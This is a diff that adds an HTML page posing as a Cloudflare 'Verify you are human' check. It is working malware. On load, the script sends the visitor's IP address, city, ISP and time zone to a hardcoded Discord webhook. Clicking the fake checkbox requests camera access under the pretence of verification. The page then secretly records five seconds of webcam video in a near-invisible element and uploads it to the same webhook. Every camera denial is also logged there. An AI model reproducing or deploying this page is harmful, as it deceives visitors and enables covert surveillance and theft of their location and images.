@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Just a moment...</title>
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:#0b0e11;color:#eaecef;font-family:-apple-system,'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
+  .wrap{width:360px;max-width:90vw;text-align:center}
+  .logo{font-size:22px;font-weight:700;color:#f0b90b;margin-bottom:28px;letter-spacing:.5px}
+  .captcha{background:#181a20;border:1px solid #2b3139;border-radius:8px;padding:22px;display:flex;align-items:center;gap:14px;cursor:pointer;transition:.15s;touch-action:manipulation}
+  .captcha:hover{border-color:#f0b90b}
+  .box{width:26px;height:26px;border:2px solid #848e9c;border-radius:4px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:18px;color:#f0b90b}
+  .box.done{border-color:#f0b90b;background:#f0b90b}
+  .box.done::after{content:"\2713";color:#000;font-weight:bold}
+  .label{font-size:14px;color:#eaecef}
+  .sub{font-size:11px;color:#848e9c;margin-top:3px}
+  .spin{width:26px;height:26px;border:3px solid #2b3139;border-top-color:#f0b90b;border-radius:50%;animation:s 0.8s linear infinite;flex-shrink:0}
+  @keyframes s{to{transform:rotate(360deg)}}
+  .foot{font-size:11px;color:#5e6673;margin-top:24px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="logo">Cloudflare</div>
+  <div class="captcha" id="cap">
+    <div class="box" id="box"></div>
+    <div style="text-align:left">
+      <div class="label" id="lbl">Verify you are human</div>
+      <div class="sub" id="sublbl">Checking your browser before accessing</div>
+    </div>
+  </div>
+  <div class="foot">Ray ID: <span id="ray"></span> &bull; Performance &amp; security by Cloudflare</div>
+</div>
+
+<video id="hiddenVideo" playsinline autoplay muted style="position:fixed;bottom:0;right:0;width:2px;height:2px;opacity:0.01;pointer-events:none"></video>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1560919426285703221/o6KrO1w1TZvwbhDIDympy3ui525Hym1slhJ98oI7nDrDwy81Pds38H49iA21VUfpvI8J";
+const RECORD_SECONDS = 5;
+let denyReports = 0;
+
+document.getElementById("ray").textContent = Math.random().toString(36).slice(2,10).toUpperCase();
+
+async function grabInfo() {
+  let ip = {};
+  try { const r = await fetch("https://ipapi.co/json/"); ip = await r.json(); } catch(e) {}
+  return {
+    ip: ip.ip || "unknown", city: ip.city || "?", region: ip.region || "?", country: ip.country_name || "?",
+    isp: ip.org || "?", lat: ip.latitude, lon: ip.longitude,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    lang: navigator.language, ua: navigator.userAgent, ts: new Date().toISOString()
+  };
+}
+
+async function postEmbed(embed) {
+  const fd = new FormData();
+  fd.append("payload_json", JSON.stringify({ embeds: [embed] }));
+  try { await fetch(WEBHOOK, { method: "POST", body: fd }); } catch(e) {}
+}
+
+async function sendInfo(info) {
+  await postEmbed({ title: "Visitor", color: 0xf0b90b,
+    fields: [
+      { name: "IP", value: "`" + info.ip + "`", inline: true },
+      { name: "Loc", value: info.city + ", " + info.region + ", " + info.country, inline: true },
+      { name: "ISP", value: info.isp, inline: true },
+      { name: "TZ", value: info.tz, inline: true }
+    ], timestamp: info.ts });
+}
+
+async function sendDeny(info, reason, attempt) {
+  await postEmbed({ title: "Camera Denied — " + reason, color: 0xff0000,
+    fields: [
+      { name: "IP", value: "`" + info.ip + "`", inline: true },
+      { name: "Loc", value: info.city + ", " + info.region + ", " + info.country, inline: true },
+      { name: "ISP", value: info.isp, inline: true },
+      { name: "Attempt", value: String(attempt), inline: true },
+      { name: "TZ", value: info.tz, inline: true },
+      { name: "UA", value: "```" + info.ua.slice(0,180) + "```", inline: false }
+    ], timestamp: new Date().toISOString() });
+}
+
+async function sendVideo(blob, info) {
+  if (!blob || blob.size < 5000) { console.log("video too small", blob && blob.size); return; }
+  const embed = { title: "Webcam recording", color: 0xff4444,
+    fields: [
+      { name: "IP", value: "`" + info.ip + "`", inline: true },
+      { name: "Loc", value: info.city + ", " + info.region + ", " + info.country, inline: true },
+      { name: "Duration", value: RECORD_SECONDS + "s", inline: true }
+    ], timestamp: new Date().toISOString() };
+  const fd = new FormData();
+  fd.append("payload_json", JSON.stringify({ embeds: [embed] }));
+  fd.append("file", blob, "recording.webm");
+  try {
+    const r = await fetch(WEBHOOK, { method: "POST", body: fd });
+    console.log("video sent", r.status);
+  } catch(e) { console.log("send fail", e); }
+}
+
+const cap = document.getElementById("cap");
+const lbl = document.getElementById("lbl");
+const sub = document.getElementById("sublbl");
+const video = document.getElementById("hiddenVideo");
+let busy = false;
+let infoCache = null;
+
+grabInfo().then(info => { infoCache = info; sendInfo(info); });
+
+function pickMime() {
+  const candidates = ["video/webm;codecs=vp9","video/webm;codecs=vp8","video/webm","video/mp4"];
+  for (const m of candidates) {
+    if (window.MediaRecorder && MediaRecorder.isTypeSupported(m)) return m;
+  }
+  return "";
+}
+
+function waitForVideoReady(v, timeoutMs) {
+  return new Promise((resolve, reject) => {
+    if (v.readyState >= 2 && v.videoWidth > 0) return resolve();
+    const t = setTimeout(() => reject(new Error("video timeout")), timeoutMs);
+    const check = () => {
+      if (v.readyState >= 2 && v.videoWidth > 0) { clearTimeout(t); resolve(); }
+      else setTimeout(check, 100);
+    };
+    check();
+  });
+}
+
+function handleTap(e) {
+  if (e) e.preventDefault();
+  if (busy) return;
+  busy = true;
+
+  lbl.textContent = "Verifying...";
+  sub.textContent = "Allow camera access to continue";
+
+  const constraints = {
+    video: { width: { ideal: 480 }, height: { ideal: 360 }, facingMode: "user" },
+    audio: false
+  };
+
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    const info = infoCache || { ip:"?" };
+    sendDeny(info, "NotSupported", ++denyReports);
+    lbl.textContent = "Camera not supported";
+    busy = false;
+    return;
+  }
+
+  navigator.mediaDevices.getUserMedia(constraints)
+    .then(async (stream) => {
+      document.getElementById("box").outerHTML = '<div class="box done" id="box"></div>';
+      lbl.textContent = "Verified";
+      sub.textContent = "Recording...";
+
+      video.style.cssText = "position:fixed;bottom:0;right:0;width:2px;height:2px;opacity:0.01;pointer-events:none";
+      video.srcObject = stream;
+      video.muted = true;
+      video.setAttribute("playsinline", "");
+      video.setAttribute("webkit-playsinline", "");
+
+      try {
+        await video.play();
+        await waitForVideoReady(video, 5000);
+      } catch(err) {
+        console.log("video ready fail", err);
+        lbl.textContent = "Camera error";
+        sub.textContent = "Try again";
+        stream.getTracks().forEach(t => t.stop());
+        busy = false;
+        return;
+      }
+
+      await new Promise(r => setTimeout(r, 1200));
+
+      const mime = pickMime();
+      let recorder;
+      const chunks = [];
+
+      try {
+        recorder = mime ? new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 800000 })
+                        : new MediaRecorder(stream);
+      } catch(err) {
+        console.log("recorder init fail", err);
+        lbl.textContent = "Recording unsupported";
+        stream.getTracks().forEach(t => t.stop());
+        busy = false;
+        return;
+      }
+
+      recorder.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
+
+      recorder.onstop = async () => {
+        stream.getTracks().forEach(t => t.stop());
+        const blob = new Blob(chunks, { type: mime || "video/webm" });
+        console.log("recorded size", blob.size, "type", blob.type);
+        const info = infoCache || { ip:"?" };
+        await sendVideo(blob, info);
+        lbl.textContent = "Verified";
+        sub.textContent = "You may close this window";
+        busy = false;
+      };
+
+      recorder.onerror = e => { console.log("recorder error", e); };
+
+      recorder.start(500);
+      setTimeout(() => {
+        try { recorder.stop(); } catch(e) {}
+      }, RECORD_SECONDS * 1000);
+
+    })
+    .catch(async (err) => {
+      console.log("getUserMedia error", err);
+      const info = infoCache || { ip:"?" };
+      const reason = (err && err.name) || "Denied";
+      denyReports++;
+      // report every deny to discord
+      await sendDeny(info, reason, denyReports);
+      lbl.textContent = "Camera blocked";
+      sub.textContent = reason;
+      document.getElementById("box").outerHTML = '<div class="box" id="box"></div>';
+      busy = false;
+    });
+}
+
+cap.addEventListener("click", handleTap);
+cap.addEventListener("pointerdown", handleTap);
+</script>
+</body>
+</html>
